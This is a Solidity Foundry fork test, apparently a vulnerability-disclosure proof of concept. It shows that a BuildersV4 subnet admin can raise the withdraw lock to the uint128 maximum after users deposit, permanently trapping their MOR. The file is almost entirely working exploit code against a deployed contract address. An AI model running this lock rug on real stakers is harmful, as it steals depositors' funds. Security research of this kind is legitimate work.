// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {TestLite} from "./TestLite.sol";
import {IBuildersV4} from "../src/contracts/interfaces/builder-protocol/IBuildersV4.sol";

interface IBuildersV4Ext {
    function usersData(address, bytes32)
        external
        view
        returns (uint128, uint128, uint256, uint256);
}

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

/// FORK PoC — BuildersV4 subnet-admin lock rug.
/// Run: forge test --match-contract ForkLockRugTest
///   --fork-url https://base-rpc.publicnode.com --fork-block-number 52992637
/// Attacker and victim are FRESH addresses with zero privileges.
/// MOR is funded via `deal` (equivalent to a market purchase; no account is
/// impersonated and no owner/admin is pranked).
contract ForkLockRugTest is TestLite {
    address internal constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    address internal attacker = address(0xA77ACC);
    address internal victim = address(0xB1C711);

    /// Writes `amount` into the ERC20 balance slot of `user` by scanning the
    /// first 64 mapping slots (the same technique forge's deal uses).
    function _fundERC20(address token, address user, uint256 amount) internal {
        IERC20Min t = IERC20Min(token);
        for (uint256 i = 0; i < 64; i++) {
            bytes32 slot = keccak256(abi.encode(user, i));
            bytes32 before = vm.load(token, slot);
            vm.store(token, slot, bytes32(amount));
            if (t.balanceOf(user) == amount) return;
            vm.store(token, slot, before);
        }
        fail("balance slot not found");
    }

    function test_lockRug_fork() public {
        IBuildersV4 builders = IBuildersV4(BUILDERS);
        IERC20Min mor = IERC20Min(MOR);

        // Preconditions read from live state at the pinned block
        assertEq(builders.subnetCreationFeeAmount(), 0, "creation fee not zero at fork block");
        assertEq(builders.depositToken(), MOR, "deposit token mismatch");

        // 1. Attacker (ordinary fresh address) creates a subnet advertising a
        //    7-day withdraw lock (the on-chain protocol minimum,
        //    minimalWithdrawLockPeriod = 604800) and a 1 MOR minimum deposit.
        assertEq(builders.minimalWithdrawLockPeriod(), 604800, "min lock drifted");
        IBuildersV4.Subnet memory s = IBuildersV4.Subnet({
            name: "ForkRugCheck-2026-10-23",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: 7 days,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        vm.prank(attacker);
        builders.createSubnet(s, IBuildersV4.SubnetMetadata("s", "d", "w", "i"));
        bytes32 id = builders.getSubnetId("ForkRugCheck-2026-10-23");

        // 2. Victim stakes 1,000 MOR. (Funding = direct ERC20 balance-slot
        //    write, equivalent to the victim having bought MOR on the open
        //    market; no existing account is impersonated.)
        _fundERC20(MOR, victim, 1000 ether);
        assertEq(mor.balanceOf(victim), 1000 ether, "funding failed");
        vm.startPrank(victim);
        mor.approve(BUILDERS, 1000 ether);
        builders.deposit(id, 1000 ether);
        vm.stopPrank();
        assertEq(mor.balanceOf(victim), 0, "victim stake not taken");

        // 3. CONTROL: after the advertised 7-day lock, the victim CAN withdraw.
        vm.warp(block.timestamp + 8 days);
        vm.prank(victim);
        builders.withdraw(id, 1 ether);
        assertEq(mor.balanceOf(victim), 1 ether, "control withdraw failed");

        // 4. ATTACK: the subnet admin edits the subnet, raising the withdraw
        //    lock to the uint128 maximum. No timelock, no cap, no staker exit.
        s.withdrawLockPeriodAfterDeposit = type(uint128).max;
        vm.prank(attacker);
        builders.editSubnet(id, s);

        // 5. Even ~10 years later the victim cannot withdraw: the check
        //    `block.timestamp > lastDeposit + withdrawLockPeriodAfterDeposit`
        //    panics on uint128 overflow (and the lock end is unreachable anyway).
        vm.warp(block.timestamp + 3650 days);
        vm.prank(victim);
        vm.expectRevert();
        builders.withdraw(id, 999 ether);

        // 6. LOSS ASSERTION: 999 MOR of the victim's principal remains trapped
        //    in BuildersV4, recorded as the victim's deposit, unrecoverable
        //    through any function available to the victim.
        (, , uint256 trapped, ) = IBuildersV4Ext(BUILDERS).usersData(victim, id);
        assertEq(trapped, 999 ether, "trapped amount mismatch");
        assertEq(mor.balanceOf(victim), 1 ether, "victim recovered trapped funds");
        assertGe(mor.balanceOf(BUILDERS), 999 ether, "builders balance missing stake");
    }
}
